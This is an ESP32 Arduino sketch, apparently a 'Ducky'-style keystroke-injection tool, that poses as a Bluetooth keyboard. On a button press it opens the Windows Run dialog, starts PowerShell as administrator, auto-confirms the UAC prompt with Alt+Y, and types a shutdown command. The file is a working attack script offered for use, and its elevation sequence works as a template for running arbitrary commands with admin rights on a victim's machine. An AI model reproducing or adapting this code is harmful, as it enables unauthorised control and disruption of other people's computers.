#include <BleKeyboard.h>

#define BUTTON_PIN 15        // Button connected to GPIO15
#define LED_PIN 2            // Built-in LED (GPIO2)

BleKeyboard bleKeyboard("ESP32 Ducky");

bool buttonPressed = false;

void typeCommand(const char* cmd, int charDelay = 50) {
  for (int i = 0; i < strlen(cmd); i++) {
    bleKeyboard.write(cmd[i]);
    delay(charDelay);
  }
  bleKeyboard.write(KEY_RETURN); // Press Enter at the end
}

void setup() {
  pinMode(BUTTON_PIN, INPUT_PULLUP); // Button input with pull-up
  pinMode(LED_PIN, OUTPUT);          // LED output
  Serial.begin(115200);

  bleKeyboard.begin();
}

void loop() {
  // LED logic: blink until connected
  if (!bleKeyboard.isConnected()) {
    digitalWrite(LED_PIN, HIGH);
    delay(250);
    digitalWrite(LED_PIN, LOW);
    delay(250);
  } else {
    digitalWrite(LED_PIN, HIGH); // LED ON when connected
  }

  // Button logic
  if (bleKeyboard.isConnected()) {
    if (digitalRead(BUTTON_PIN) == LOW && !buttonPressed) {
      buttonPressed = true;

      // --- Payload start ---
      // Open Run dialog (Win + R)
      bleKeyboard.press(KEY_LEFT_GUI);
      bleKeyboard.press('r');
      delay(200);
      bleKeyboard.releaseAll();
      delay(1000);

      // Type powershell
      typeCommand("powershell", 50);
      delay(500);

      // Ctrl + Shift + Enter (Run as administrator)
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(200);
      bleKeyboard.releaseAll();
      delay(2000); // Wait for UAC prompt

      // Alt + Y to confirm UAC
      bleKeyboard.press(KEY_LEFT_ALT);
      bleKeyboard.press('y');
      delay(100);
      bleKeyboard.releaseAll();
      delay(5000); // Wait for PowerShell to open

      // Type the payload command
      typeCommand("shutdown /s /t 00", 50);
      // --- Payload end ---

      Serial.println("Payload sent.");
    }

    // Reset button state when released
    if (digitalRead(BUTTON_PIN) == HIGH) {
      buttonPressed = false;
    }
  }
}
